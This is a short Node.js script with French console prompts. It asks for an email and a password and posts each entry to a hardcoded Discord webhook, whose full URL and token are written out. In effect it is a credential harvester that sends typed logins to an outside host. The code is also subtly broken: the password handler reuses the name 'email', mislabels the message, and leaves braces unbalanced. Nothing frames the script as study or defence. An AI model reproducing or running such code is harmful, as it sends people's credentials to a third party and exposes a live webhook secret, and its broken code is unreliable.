import readline from "readline";

const WEBHOOK_URL = "https://discord.com/api/webhooks/1464371729592746277/XAJJiwcKtS_SI5DzDr1_wOcAstnbo0TOwmSnC0ijnwmoBVo4pJlFV2hIkt4RDSvyx8w2";

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question("Entre un email : ", async (email) => {
  await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: `Email reçu : ${email}`
    })
  });

  rl.question("Entre un mot de passe : ", async (email) => {
  await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: `Email reçu : ${email}`
    })
  });

  console.log("Envoyé sur Discord");
  rl.close();
});
